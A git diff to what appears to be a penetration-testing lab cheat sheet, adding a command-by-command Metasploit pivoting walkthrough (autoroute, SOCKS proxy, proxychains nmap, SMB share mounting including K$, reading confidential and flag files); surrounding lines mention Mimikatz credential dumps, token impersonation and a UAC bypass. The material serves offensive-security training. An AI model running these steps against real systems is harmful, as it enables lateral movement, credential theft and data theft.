@@ -367,7 +367,7 @@ run
 ---
 
 
-### 🧠 Privilege Escalation via Writable Script + `sudo` Misconfiguration
+###  Privilege Escalation via Writable Script + `sudo` Misconfiguration
 
 1. **Locate writable script or suspicious file access**:
 
@@ -390,6 +390,56 @@ impersonate_token blb\\Administrator
 getuid
 ```
 
+### Internal Pivoting with autoroute + SOCKS Proxy + Proxychains + SMB Enumeration
+
+  ```bash
+  # 1. Add target subnet to the routing table in Meterpreter
+  autoroute -s <subnet>/<mask>
+  
+  # 2. Verify proxychains is configured to use 127.0.0.1:9050
+  cat /etc/proxychains4.conf
+  
+  # 3. Background the Meterpreter session
+  background
+  
+  # 4. Start SOCKS proxy in Metasploit
+  use auxiliary/server/socks_proxy
+  show options
+  set SRVPORT 9050
+  set VERSION 4a
+  exploit
+  
+  # 5. View running jobs and scan target through the proxy
+  jobs
+  proxychains nmap <target> -sT -Pn -sV -p 445
+  
+  # 6. Return to Meterpreter and open shell
+  sessions -i <session_id>
+  shell
+  
+  # 7. Enumerate SMB shares
+  net view <target>
+  # (CTRL+C if stuck in interactive command)
+  
+  # 8. Migrate to stable desktop process
+  migrate -N explorer.exe
+  
+  # 9. Reopen shell and mount shares
+  shell
+  net view <target>
+  net use D: \\<target>\Documents
+  net use K: \\<target>\K$
+  
+  # 10. Browse mapped drives
+  dir D:
+  dir K:
+  # (CTRL+C to interrupt)
+  
+  # 11. Extract data of interest
+  cat D:\\Confidential.txt
+  cat D:\\FLAG2.txt
+  ```
+
 ### Privilege Escalation via BadBlue 2.7 (Passthru RCE → LSASS Migration → Mimikatz Dump)
 
 1. On the attacker machine:
@@ -406,7 +456,7 @@ getuid
    lsa_dump_sam
    lsa_dump_secrets
    ```
-   
+
 ### Privilege Escalation via Akagi64.exe (UAC Bypass) with Reverse Shell
 
 ```bash
